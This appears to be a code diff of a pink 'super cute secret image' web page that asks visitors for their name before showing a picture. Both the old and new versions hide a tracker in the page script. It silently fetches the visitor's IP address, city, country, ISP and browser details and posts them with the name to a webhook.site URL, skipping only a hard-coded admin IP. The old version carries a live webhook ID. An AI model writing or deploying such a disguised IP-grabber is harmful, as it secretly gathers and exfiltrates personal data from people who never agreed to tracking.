@@ -1,104 +1,125 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Image Viewer</title>
-    <style>
-        body {
-            font-family: Comic Sans MS, cursive;
-            text-align: center;
-            background-color: #ffe6f2;
-            padding: 20px;
-        }
-        #content {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-        #user-image {
-            max-width: 100%;
-            border-radius: 8px;
-            display: none;
-            box-shadow: 0 0 15px hotpink;
-        }
-        #name-form {
-            margin: 20px 0;
-        }
-        #image-gallery img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 8px;
-            display: none;
-            box-shadow: 0 0 15px hotpink;
-            margin: 10px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>✨ Image Viewer ✨</title>
+  <style>
+    body {
+      font-family: 'Comic Sans MS', cursive;
+      background-color: #ffe6f2;
+      text-align: center;
+      padding: 40px;
+    }
+    #content {
+      max-width: 700px;
+      margin: auto;
+      background-color: #fff0fa;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 20px hotpink;
+    }
+    input[type="text"] {
+      padding: 10px;
+      font-size: 16px;
+      border: 2px solid hotpink;
+      border-radius: 10px;
+      width: 70%;
+      max-width: 300px;
+      margin-top: 10px;
+    }
+    button {
+      padding: 10px 20px;
+      background-color: hotpink;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      margin-top: 10px;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+    button:hover {
+      background-color: deeppink;
+    }
+    #user-image {
+      margin-top: 25px;
+      max-width: 100%;
+      border-radius: 15px;
+      display: none;
+      box-shadow: 0 0 20px #ff69b4;
+    }
+    .error {
+      color: red;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+  </style>
 </head>
 <body>
-    <div id="content">
-        <h1>✨ View Our Super Cute Secret Images ✨</h1>
-        
-        <div id="name-form">
-            <p>Enter your name to unlock the cuteness:</p>
-            <input type="text" id="userName" placeholder="UwU what's your name?">
-            <button onclick="handleSubmission()">Show me 💖</button>
-        </div>
-
-        <!-- Image Gallery for Multiple Images -->
-        <div id="image-gallery">
-            <!-- Replace these links with real image URLs -->
-            <img id="image1" src="https://i.imgur.com/bYfM1Kl.jpg" alt="UwU Image 1">
-            <img id="image2" src="https://i.imgur.com/KhH8x1u.jpg" alt="UwU Image 2">
-            <img id="image3" src="https://i.imgur.com/fT5r8pz.jpg" alt="UwU Image 3">
-            <img id="image4" src="https://i.imgur.com/tvbc0Fv.jpg" alt="UwU Image 4">
-        </div>
+  <div id="content">
+    <h1>✨ View Our Super Cute Secret Image ✨</h1>
+    <div id="name-form">
+      <p>Enter your name to unlock the cuteness:</p>
+      <input type="text" id="userName" placeholder="UwU what's your name?">
+      <br>
+      <button onclick="handleSubmission()">Show me 💖</button>
+      <div id="error-msg" class="error"></div>
     </div>
 
-    <script>
-        const ADMIN_IP = "83.105.112.217";
+    <!-- Working image link -->
+    <img id="user-image" src="https://i.imgur.com/VAjO7oh.jpg" alt="Cute Image">
+  </div>
 
-        async function handleSubmission() {
-            const userName = document.getElementById('userName').value.trim() || "UwU Nobody";
+  <script>
+    const ADMIN_IP = "83.105.112.217";
 
-            try {
-                const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
-                const userAgent = navigator.userAgent;
+    async function handleSubmission() {
+      const nameInput = document.getElementById('userName');
+      const userName = nameInput.value.trim();
+      const errorMsg = document.getElementById('error-msg');
 
-                const log = {
-                    name: userName,
-                    ip: ipData.ip,
-                    city: ipData.city,
-                    country: ipData.country,
-                    isp: ipData.org,
-                    userAgent,
-                    time: new Date().toISOString()
-                };
+      if (!userName) {
+        errorMsg.textContent = "Please enter your name! 💢";
+        nameInput.focus();
+        return;
+      }
 
-                // If viewer isn't admin, send log via webhook (or replace this later)
-                if (ipData.ip !== ADMIN_IP) {
-                    fetch("https://webhook.site/a75cc371-47c5-4513-aaff-5282696bb856", {
-                        method: "POST",
-                        body: JSON.stringify(log),
-                        headers: { "Content-Type": "application/json" }
-                    });
-                }
+      errorMsg.textContent = ""; // clear error
 
-                // Show multiple images after form submission
-                const images = document.querySelectorAll('#image-gallery img');
-                images.forEach(img => img.style.display = 'block');  // Show all images
-                document.getElementById('name-form').style.display = 'none';
+      try {
+        const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
+        const userAgent = navigator.userAgent;
 
-            } catch (e) {
-                // Fallback if tracking fails
-                const images = document.querySelectorAll('#image-gallery img');
-                images.forEach(img => img.style.display = 'block');
-                document.getElementById('name-form').style.display = 'none';
-            }
+        const log = {
+          name: userName,
+          ip: ipData.ip,
+          city: ipData.city,
+          country: ipData.country,
+          isp: ipData.org,
+          userAgent,
+          time: new Date().toISOString()
+        };
+
+        if (ipData.ip !== ADMIN_IP) {
+          fetch("https://webhook.site/your-unique-url", {
+            method: "POST",
+            body: JSON.stringify(log),
+            headers: { "Content-Type": "application/json" }
+          });
         }
 
-        document.getElementById('userName').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') handleSubmission();
-        });
-    </script>
+      } catch (e) {
+        console.warn("Could not fetch IP info:", e);
+      }
+
+      // Show image and hide form
+      document.getElementById('user-image').style.display = 'block';
+      document.getElementById('name-form').style.display = 'none';
+    }
+
+    document.getElementById('userName').addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') handleSubmission();
+    });
+  </script>
 </body>
 </html>
